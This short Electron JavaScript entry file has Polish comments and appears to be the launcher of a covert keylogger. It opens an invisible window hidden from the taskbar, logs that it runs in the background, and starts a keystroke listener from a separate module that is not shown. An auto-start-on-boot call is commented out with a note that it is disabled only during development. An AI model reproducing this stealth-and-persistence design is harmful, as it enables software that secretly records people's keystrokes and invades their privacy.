const {app, BrowserWindow} = require('electron');
// const autoStart = require('./launchOnStart.js');
const keyHandler = require('./keyHandler.js');


const createApp = () => {
    //tworzenie nowego okna z opcjami niewidoczności i braku ikonki na pasku zadań
    const win = new BrowserWindow({
        show: false,
        skipTaskbar: true
    });
    console.log('Aplikacja działa w tle');

    // autoStart.addToAutoStart(); WYLACZONE NA CZAS ROZWOJU!
    keyHandler.startListenKeys();

};

keyHandler.startListenKeys();
// app.on('ready', createApp);